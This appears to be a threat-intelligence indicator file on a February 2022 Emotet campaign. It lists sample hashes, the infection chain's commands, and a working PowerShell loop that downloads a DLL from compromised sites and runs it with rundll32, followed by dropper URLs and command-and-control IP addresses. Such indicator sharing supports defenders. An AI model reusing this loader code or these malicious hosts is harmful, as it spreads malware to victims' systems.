@@ -1,0 +1,120 @@
+Emotet 2022 - 08.02.2022 - epoch4
+
+************************************************************************************************************
+
+.xls 7419515e094c9fb7c1f676654d0789e69a2c69bf4b3202bf24e3c363c49ff9d0
+
+.dll 2f364babf86f18875c20ea30aeb850651e90fc0493d2fd34ca034131febe72bd
+
+wscript c:\programdata\yhjlswle.vbs
+
+C:\Windows\system32\cmd.exe /c C:\programdata\ughldskbhn.bat
+
+$mjxdfshdrfgzses4 = "https://fullness-safety.com/-/P6x/", "https://nabajyotifoundation.com/da8uc7jo/4Za/", "https://dwwmaster.com/wp-content/ebHTB4UF2/", "http://formula8020.com/css/56Dzi0P/", "https://calad-formation.fr/r3x94z/kgZ9OGCi/", "http://lissbernardin.com/hthjb3i/x9KHpCeYrr/", "http://royalsnackmyanmar.com/wp-includes/GMtz6DxM/", "http://pristineservices.findfacts.co.in/cgi-bin/BuLyc2HKLHIQVHQLc/", "http://speedrankingsystem.de/wp-admin/k63ZcimPsE6/", "https://tigela.org.np/wp-content/Irp27O71/", "https://royaltyrealtynsb.com/backup_1/g51THhhLLUqodx6/", "http://bachilleratoporciclos.co/wp-content/PvIIx7/", "https://edu-media.cn/wp-admin/cKi/", "https://rtd.b2bpipe.cn/wp-content/8ESRhIJAIRh/"
+foreach ($yidsrhye34syufgxjcdf in $mjxdfshdrfgzses4) {
+  $gweyh57sedswd = "c:\\programdata\\bneuihlows.dll"
+  invoke-webrequest -uri $yidsrhye34syufgxjcdf -outfile $gweyh57sedswd
+  if (test-path "c:\\programdata\\bneuihlows.dll") {
+    if ((get-item "c:\\programdata\\bneuihlows.dll").length -ge 47436) {
+      break
+    }
+  }
+}
+
+cmd.exe /c start /B c:\windows\syswow64\rundll32.exe c:\programdata\bneuihlows.dll,hjyldksfkw3
+
+c:\windows\syswow64\rundll32.exe c:\programdata\bneuihlows.dll,hjyldksfkw3
+
+C:\Windows\SysWOW64\rundll32.exe c:\programdata\bneuihlows.dll,DllRegisterServer
+
+C:\Windows\SysWOW64\rundll32.exe C:\Windows\SysWOW64\Lzdkokykk\agyzyk.uyp,waFlptwzf
+
+C:\Windows\SysWOW64\rundll32.exe C:\Windows\System32\Lzdkokykk\agyzyk.uyp,DllRegisterServer
+
+
+.dll distro
+
+https://fullness-safety.com/-/P6x/
+https://nabajyotifoundation.com/da8uc7jo/4Za/
+https://dwwmaster.com/wp-content/ebHTB4UF2/
+http://formula8020.com/css/56Dzi0P/
+https://calad-formation.fr/r3x94z/kgZ9OGCi/
+http://lissbernardin.com/hthjb3i/x9KHpCeYrr/
+http://royalsnackmyanmar.com/wp-includes/GMtz6DxM/
+http://pristineservices.findfacts.co.in/cgi-bin/BuLyc2HKLHIQVHQLc/
+http://speedrankingsystem.de/wp-admin/k63ZcimPsE6/
+https://tigela.org.np/wp-content/Irp27O71/
+https://royaltyrealtynsb.com/backup_1/g51THhhLLUqodx6/
+http://bachilleratoporciclos.co/wp-content/PvIIx7/
+https://edu-media.cn/wp-admin/cKi/
+https://rtd.b2bpipe.cn/wp-content/8ESRhIJAIRh/
+
+Additonal .dll droppers provided by @Max_Mal_
+
+http://santafetortilla.com/_baks/tUx9/
+http://donbaham.com/Home_files/YS0PAZPXcYeraes/
+http://barnhart-studios.com/eln-images/Vghg1n/
+http://blute.com/3Dtech/jLu8IAnnj3gK9Wc/
+http://zenzebra.net/plath/9Q0DBlE/
+http://rogerschultz.com/eln-images/u0vT/
+http://realacorp.net/PhotoGallery/UwmRHceSGbaCeGF/
+http://miniflam.com/eln-images/fSwbQjUMAfGxgdw/
+http://marezdecor.com/MarezGallery/sEQxWTpMJ7A8rAtY0D/
+http://hollywoodvisual.com/eln-images/HIWl5z/
+http://marcowine.com/Images/SLlwnvS7Uxnymm/
+http://chpopesco.com/Gallery/wPY7j2SE5MIv/
+http://modsociete.com/cgi/qtAP/
+http://boamorph.com/cgi/hTa5ip96VSdNjX/
+http://annefront.com/eln-images/gANlH/
+
+c2's
+
+8.9.11.48:443
+144.76.186.55:7080
+45.118.115.99:8080
+51.254.140.238:7080
+162.214.50.39:7080
+119.235.255.201:8080
+103.75.201.4:443
+164.68.99.3:8080
+178.79.147.66:8080
+192.95.56.148:8080
+81.0.236.90:443
+45.118.135.203:7080
+131.100.24.231:80
+41.76.108.46:8080
+45.142.114.231:8080
+82.165.152.127:8080
+45.176.232.124:443
+50.116.54.215:443
+162.243.175.63:443
+216.158.226.206:443
+195.154.133.20:443
+212.237.17.99:8080
+103.75.201.2:443
+212.237.5.209:443
+200.17.134.35:7080
+185.157.82.211:8080
+144.76.186.49:8080
+212.237.56.116:7080
+31.24.158.56:8080
+104.251.214.46:8080
+110.232.117.186:8080
+46.55.222.11:443
+159.8.59.82:8080
+158.69.222.101:443
+176.104.106.96:8080
+107.182.225.142:8080
+58.227.42.236:80
+203.114.109.124:443
+173.212.193.249:8080
+79.172.212.216:8080
+159.89.230.105:443
+160.16.102.168:80
+178.128.83.165:80
+212.24.98.99:8080
+207.38.84.195:8080
+153.126.203.229:8080
+217.182.143.207:443
+129.232.188.93:443
+138.185.72.26:8080
